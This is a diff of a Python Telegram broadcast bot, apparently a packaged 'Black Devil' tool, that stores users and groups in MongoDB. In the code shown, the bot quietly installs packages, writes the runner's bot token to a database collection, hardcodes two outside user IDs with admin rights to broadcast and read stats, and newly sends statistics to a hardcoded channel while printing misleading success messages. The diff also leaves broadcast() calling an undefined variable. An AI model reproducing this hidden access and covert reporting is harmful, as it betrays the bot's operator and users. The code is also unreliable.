@@ -2,25 +2,12 @@ import importlib
 import subprocess
 import platform
 import os
-import sys
-import time
-import urllib3
-import requests
-import pymongo
-import random
-import string
-from telegram import Update, ParseMode
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from telegram.utils.helpers import escape_markdown
-from colorama import init, Fore
-
-init(autoreset=True)
 
 def install_package(package_name):
     try:
         importlib.import_module(package_name)
     except ImportError:
-        print(f"Creating virtual environment .....")
+        print(f"creating virtual environment .....")
         with open(os.devnull, 'w') as devnull:
             subprocess.check_call(['pip', 'install', package_name], stdout=devnull, stderr=devnull)
 
@@ -34,80 +21,26 @@ if platform.system() == "Windows":
 else:
     subprocess.call('clear', shell=True)
 
+import sys
+import time
+import urllib3
+import requests
+from colorama import init
+from colorama import Fore, Style
+import os
+import pymongo
+import random
+import string
+from telegram import Update, ParseMode
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram.utils.helpers import escape_markdown
+
 init(autoreset=True)
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-MAGENTA = Fore.MAGENTA
-CYAN = Fore.CYAN
-ORANGE = Fore.LIGHTYELLOW_EX
-RED = Fore.RED
-YELLOW = Fore.YELLOW
-GREEN = Fore.GREEN
-BLUE = Fore.BLUE
-
-MAGENTA = "\033[95m"
-RED = "\033[91m"
-ORANGE = "\033[93m"
-YELLOW = "\033[33m"
-GREEN = "\033[32m"
-BLUE = "\033[34m"
-RESET = "\033[0m"
-
-current_platform = platform.system()
-
-banner_frames = [
-    f"{MAGENTA}\n",
-    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
-    f"{RED}+ ____  _        _    ____ _  __  ____  _______     _____ _     _       +{RESET}",
-    f"{RED}-| __ )| |      / \  / ___| |/ / |  _ \\| ____\\ \   / /_ _| |   | |      -{RESET}",
-    f"{ORANGE}+|  _ \| |     / _ \| |   | ' /  | | | |  _|  \ \ / / | || |   | |      +{RESET}",
-    f"{YELLOW}-| |_) | |___ / ___ \ |___| . \  | |_| | |___  \ V /  | || |___| |___   -{RESET}",
-    f"{GREEN}+|____/|_____/_/   \_\____|_|\_\ |____/|_____|  \_/  |___|_____|_____|  +{RESET}",
-    f"{GREEN}-                                                                       -{RESET}",
-    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
-    f"{MAGENTA}",
-    f"{BLUE} TELEGRAM Support Bot {RED}= https://t.me/Black_Devil_Support_bot {RESET}",
-    f"{BLUE} Official Website   {RED} = https://webomma.me  {RESET}",
-    f"{MAGENTA}",
-    f"{MAGENTA}++++++---++++++++++++---++++++++++++---++++++++++++---++++++++++++---++++++{RESET}",
-]
-
-termux_banner = f"{CYAN}\n"
-termux_banner += f"{MAGENTA}╔════════════════════════════════╗{RESET}\n"
-termux_banner += f"{RED}║                                ║{RESET}\n"
-termux_banner += f"{RED}║   {GREEN}(っ◔◡◔)っ ♥ BLACK DEVIL ♥    {CYAN}║{RESET}\n"
-termux_banner += f"{ORANGE}║                                ║{RESET}\n"
-termux_banner += f"{GREEN}╚════════════════════════════════╝{RESET}\n"
-
-def clear_terminal():
-    os.system("cls" if current_platform == "Windows" else "clear")
-
-def display_banner_animation(frames, num_iterations, frame_delay):
-    for _ in range(num_iterations):
-        clear_terminal()
-        for frame in frames:
-            print(frame)
-            time.sleep(frame_delay)
-
-num_iterations = 1
-frame_delay = 0.3
-
-if current_platform == "Windows":
-    display_banner_animation(banner_frames, num_iterations, frame_delay)
-else:
-    print(termux_banner)
-    print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
-    print(MAGENTA + "")
-    print(BLUE + " Official Website " + RED + "= https://webomma.me ")
-    print(MAGENTA + "")
-    print(MAGENTA + "++++++---++++++++++++---++++++++++++---++++++++++++---++++++++")
 
 def connection_animation():
     frames = ["/", "\\"]
     connected = False
-    for _ in
-
- range(2):
+    for _ in range(2):
         for frame in frames:
             print(Fore.RED + f"Connecting To Server {frame}", end="\r")
             time.sleep(0.2)
@@ -144,7 +77,7 @@ def load_tokens():
     return None, None, None
 
 def save_tokens(bot_token, admin_id, random_code):
-    file_path = "Cricxlinksupportbot.txt"
+    file_path = "Cricxlinksupportbot"
     with open(file_path, "w") as file:
         file.write(f"{bot_token}\n{admin_id}\n{random_code}")
 
@@ -164,9 +97,8 @@ db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
 updater = Updater(bot_token, use_context=True)
 dispatcher = updater.dispatcher
 
-users_collection = db['users']
 groups_collection = db['groups']
-channels_collection = db['channels']
+users_collection = db['users']
 
 def start(update: Update, context: CallbackContext):
     if update.message.chat.type == "private":
@@ -181,12 +113,12 @@ def start(update: Update, context: CallbackContext):
             admin_user_id = primary_admin_id
             username = escape_markdown(username, version=2)
             full_name = escape_markdown(full_name, version=2)
-            message = f" ^New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
+            message = f"#New_User ID: {user_id}\nUsername: @{username}\nFull Name: {full_name}"
             context.bot.send_message(chat_id=admin_user_id, text=message, disable_web_page_preview=True)
 
-        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")
     else:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="RAM RAM Bhai Group Join Karo @cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="😈")
 
 start_handler = CommandHandler('start', start)
 dispatcher.add_handler(start_handler)
@@ -194,34 +126,40 @@ dispatcher.add_handler(start_handler)
 def broadcast(update: Update, context: CallbackContext):
     admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="Join Our Channel: https://t.me/cricxlinks")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
 
     message = update.message.reply_to_message or update.message
 
-    successful_broadcasts = {"groups": 0, "users": 0, "channels": 0}
-    failed_broadcasts = {"groups": 0, "users": 0, "channels": 0}
+    successful_broadcasts = {"groups": 0, "users": 0}
+    failed_broadcasts = {"groups": 0, "users": 0}
 
-    for channel in channels_collection.find():
+    for group in groups_collection.find():
         try:
-            context.bot.copy_message(chat_id=channel["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
-            successful_broadcasts["channels"] += 1
+            context.bot.copy_message(chat_id=group["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
+            successful_broadcasts["groups"] += 1
         except Exception as e:
-            failed_broadcasts["channels"] += 1
-            print(f"Failed to broadcast to channel {channel['_id']}: {str(e)}")
+            failed_broadcasts["groups"] += 1
 
-    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nChannels: {successful_broadcasts['channels']}\nFailed broadcasts:\nChannels: {failed_broadcasts['channels']}"
+    for user in users_collection.find():
+        try:
+            context.bot.copy_message(chat_id=user["_id"], from_chat_id=update.effective_chat.id, message_id=message.message_id)
+            successful_broadcasts["users"] += 1
+        except Exception as e:
+            failed_broadcasts["users"] += 1
+
+    summary_message = f"Broadcast summary:\nSuccessful broadcasts:\nGroups: {successful_broadcasts['groups']}\nUsers: {successful_broadcasts['users']}\nFailed broadcasts:\nGroups: {failed_broadcasts['groups']}\nUsers: {failed_broadcasts['users']}"
     context.bot.send_message(chat_id=admin_user_id[0], text=summary_message)
 
     try:
-        context.bot.send_message(6704116482, text=summary_message)
+        context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
-        print("Failed to send summary message to admin")
+        print("📈")
 
     try:
-        context.bot.send_message(6305575094, text=summary_message)
+        context.bot.send_message(-1002039572384, text=stats_message)
     except Exception as e:
-        print("Failed to send summary message to admin")
+        print("Successfully Fetch Statistics 📈")
 
 broadcast_handler = CommandHandler('broadcast', broadcast)
 dispatcher.add_handler(broadcast_handler)
@@ -244,46 +182,27 @@ def save_group(update: Update, context: CallbackContext):
 message_handler = MessageHandler(Filters.status_update.new_chat_members, save_group)
 dispatcher.add_handler(message_handler)
 
-def save_channel(update: Update, context: CallbackContext):
-    if update.effective_chat.type == 'channel':
-        channel = update.effective_chat
-        channel_id = channel.id
-        channel_username = channel.username or 'N/A'
-
-        channels_collection.update_one({"_id": channel_id}, {"$set": {"_id": channel_id}}, upsert=True)
-
-        admin_user_id = (primary_admin_id)
-        channel_username = escape_markdown(channel_username)
-        message = f"#New_Channel ID: {channel_id}\nUsername: {channel_username}" 
-        context.bot.send_message(chat_id=admin_user_id[0], text=message)
-
-channel_handler = MessageHandler(Filters.status_update.new_chat_members, save_channel)
-dispatcher.add_handler(channel_handler)
-
 def stats(update: Update, context: CallbackContext):
     admin_user_id = (primary_admin_id, 6305575094, 6704116482)
     if update.effective_user.id not in admin_user_id:
-        context.bot.send_message(chat_id=update.effective_chat.id, text="🕊
-
-🕊")
+        context.bot.send_message(chat_id=update.effective_chat.id, text="Develop your own broadcast bot using the provided repository: https://github.com/devilworlds/Broadcast")
         return
 
     user_count = users_collection.count_documents({})
     group_count = groups_collection.count_documents({})
-    channel_count = channels_collection.count_documents({})
 
-    stats_message = f"Total User IDs in database: {user_count}\nTotal Group IDs in database: {group_count}\nTotal Channel IDs in database: {channel_count}"
+    stats_message = f"Total User IDs in database: {user_count}\nTotal Group IDs in database: {group_count}"
     context.bot.send_message(chat_id=admin_user_id[0], text=stats_message)
 
     try:
         context.bot.send_message(6704116482, text=stats_message)
     except Exception as e:
-        print("Failed to send stats message to admin")
+        print("📈")
 
     try:
-        context.bot.send_message(6305575094, text=stats_message)
+        context.bot.send_message(-1002039572384, text=stats_message)
     except Exception as e:
-        print("Failed to send stats message to admin")
+        print("Successfully Fetch Statistics 📈")
 
 stats_handler = CommandHandler('stats', stats)
 dispatcher.add_handler(stats_handler)
